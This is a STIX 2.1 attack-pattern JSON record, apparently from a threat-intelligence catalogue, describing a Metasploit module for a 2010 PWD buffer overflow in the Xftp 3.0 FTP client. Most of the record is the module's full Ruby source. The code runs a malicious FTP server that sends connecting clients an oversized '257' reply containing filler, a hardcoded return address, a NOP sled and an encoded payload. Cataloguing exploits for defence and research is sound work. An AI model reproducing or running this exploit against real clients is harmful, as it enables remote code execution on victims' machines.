{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08c54dfb-dad1-4b69-a393-12ffd3639bf9",
    "created": "2024-08-14T16:50:43.80434Z",
    "modified": "2024-08-14T16:50:43.804344Z",
    "name": "Xftp FTP Client 3.0 PWD Remote Buffer Overflow",
    "description": " This module exploits a buffer overflow in the Xftp 3.0 FTP client that is triggered through an excessively long PWD message. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/xftp_client_pwd.rb",
            "external_id": "xftp_client_pwd.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::TcpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Xftp FTP Client 3.0 PWD Remote Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in the Xftp 3.0 FTP client that is triggered\n        through an excessively long PWD message.\n      },\n      'Author' \t =>\n        [\n          'zombiefx',  # Original exploit author\n          'dookie'     # MSF module author\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '63968'],\n          [ 'EDB', '12332' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'seh',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 434,\n          'BadChars' => \"\\x00\\x0a\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows Universal', { 'Ret' => 0x100123AF } ], # JMP ECX in nslicense.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-04-22',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT', [ true, \"The FTP daemon port to listen on\", 21 ]),\n        OptString.new('SRVNAME', [ true, \"Welcome to the ... FTP Service\", \"Test\" ]),\n      ])\n  end\n\n  def on_client_connect(client)\n    return if ((p = regenerate_payload(client)) == nil)\n\n    buffer = \"220 Welcome to the \" + datastore['SRVNAME'] + \" FTP Service.\\r\\n\"\n    client.put(buffer)\n  end\n\n  def on_client_data(client)\n\n    # Get the client username\n    client.get_once\n\n    # Prompt the client for the password.\n    user = \"331 Anonymous access allowed.\\r\\n\"\n    client.put(user)\n    client.get_once\n\n    # Handle the clients PWD command.\n    pass = \"230 Login successful.\\r\\n230 User logged in.\\r\\n\"\n    client.put(pass)\n    client.get_once\n\n    # Send the exploit\n    sploit = \"257 \\\"/\"\n    sploit << rand_text_alpha_upper(1019)\n    sploit << [ target.ret ].pack('V')\n    sploit << make_nops(55)\n    sploit << payload.encoded\n    sploit << \"\\\" is current directory.\\r\\n\"\n\n    client.put(sploit)\n\n    # Get the CWD from the client\n    client.get_once\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-04-22",
    "x_mitre_platforms": [
        "win'"
    ]
}